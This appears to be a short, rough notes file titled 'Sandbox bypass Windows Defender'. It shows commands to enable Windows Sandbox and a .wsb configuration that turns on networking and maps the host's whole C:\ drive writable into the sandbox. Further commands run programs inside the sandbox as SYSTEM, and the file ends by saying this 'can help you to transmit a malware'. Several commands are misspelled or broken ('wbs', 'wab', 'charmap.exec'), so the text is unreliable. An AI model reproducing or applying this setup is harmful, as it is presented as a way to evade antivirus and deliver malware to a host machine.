# JOHN-HALLOND
         SANDBOX BY PASS WINDOWS DEFENDER
Hack the sandbox: unveiling the truth behind disappearing artifacts
https://blog-en.itochuci.co.jp/entry/2025/03/12/140000
windows sandbox only on windows 10&11 
Enable it by typing windows features then turn it on
Open windows terminal
=> dism /online /Enable-Feature /FeatureName:"Containers-DisposableClientVM" /ALL /NoRestart
echo hello > yooo
you can use in power shell
=> Enable-WindowsOptionalFeature -FeatureName "Containers-DisposableClientVM" -Online -All -NoRestart
search for sandbox in windows
on the 3 toggles on the sandbox share desktop 
in the sublime text input;
<Configuration>
    <Networking>Enable</Networking>
    <MappedFolders>
        <MappedFolder>
            <HostFolder>C:\</HostFolder>
            <SandboxFolder>C:\Users\WDAGUtilityAccount\Desktop\Host</SandboxFolder>
            <ReadOnly>false</ReadOnly>
        </MappedFolder>
    </MappedFolders>
    <LogonCommand>
        <Command>charmap.exe</Command>
    </LogonCommand>
    <MemoryInMB>1024</MemoryInMB>
</Configuration>
save it as text.wsb also in xml
Also name the sandbox as test.wsb
 terminal
=> wbs start -h
wbs start -c '<Configuration>
    <Networking>Enable</Networking>
    <MappedFolders>
        <MappedFolder>
            <HostFolder>C:\</HostFolder>
            <SandboxFolder>C:\Users\WDAGUtilityAccount\Desktop\Host</SandboxFolder>
            <ReadOnly>false</ReadOnly>
        </MappedFolder>
    </MappedFolders>
    <LogonCommand>
        <Command>iexpress.exe</Command>
    </LogonCommand>
    <MemoryInMB>1024</MemoryInMB>
</Configuration>'
=> wsb connect --id !generated!
=> wab exec --id !generated!-c "charmap.exec" -d -r SYSTEM
=> wab exec --id !generated!-c "charmap.exec" -d -r ExistingLogin
conclusion All this can help you to transmit a malware
    


        

